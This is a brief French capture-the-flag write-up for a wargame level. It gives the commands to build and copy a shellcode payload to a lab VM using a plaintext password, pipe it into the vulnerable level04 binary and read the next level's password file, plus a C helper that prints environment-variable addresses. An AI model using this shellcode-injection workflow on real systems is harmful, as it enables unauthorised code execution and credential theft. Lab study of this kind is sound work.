### Commandes

Depuis l'hôte :

```bash
make && ./generator && sshpass -p 'kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf' scp -P 4242 shellcode level04@localhost:/tmp/
```

Sur la vm :

```bash
cat /tmp/shellcode - | ./level04
cat /home/users/level05/.pass
```

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
        if (argc != 2)
        {
                printf("%s <ENV_VAR>\n", argv[0]);
                return 1;
        }
        char* ptr = getenv(argv[1]);
        printf("The address of environment variable \"%s\" is %p\n", argv[1], ptr);
}
```
